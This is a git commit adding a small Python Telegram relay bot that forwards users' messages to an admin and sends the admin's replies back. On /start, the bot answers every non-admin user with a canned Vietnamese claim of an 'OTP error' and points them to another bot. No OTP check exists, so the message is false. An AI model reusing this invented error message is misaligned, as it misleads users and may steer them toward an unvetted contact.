28524d09b59c5ec6ffa9aaf62bae7cf3dbd6a460
dn095688-alt <dn095688@gmail.com>
2026-05-29 17:26:48 +0700

    Create bot22.py

---
+++ bot22.py
@@ -0,0 +1,36 @@
+import telebot
+import os
+
+TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN_2")
+ADMIN_ID = int(os.environ.get("ADMIN_ID"))
+
+bot = telebot.TeleBot(TELEGRAM_TOKEN)
+user_map = {}
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    if message.chat.id != ADMIN_ID:
+        bot.reply_to(message, "OTP lỗi vui lòng liên hệ https://t.me/b52_otpbot")
+
+@bot.message_handler(func=lambda msg: msg.chat.id != ADMIN_ID)
+def from_user(message):
+    user = message.from_user
+    name = user.first_name + (f" @{user.username}" if user.username else "")
+    sent = bot.send_message(
+        ADMIN_ID,
+        f"[BOT 2] {name} (ID: {user.id}): {message.text}",
+    )
+    user_map[sent.message_id] = user.id
+
+@bot.message_handler(func=lambda msg: msg.chat.id == ADMIN_ID and msg.reply_to_message)
+def from_admin(message):
+    original_id = message.reply_to_message.message_id
+    target_id = user_map.get(original_id)
+    if target_id:
+        bot.send_message(target_id, message.text)
+        bot.reply_to(message, "Da gui!")
+    else:
+        bot.reply_to(message, "Khong tim thay nguoi dung!")
+
+print("Bot 2 dang chay...")
+bot.polling()
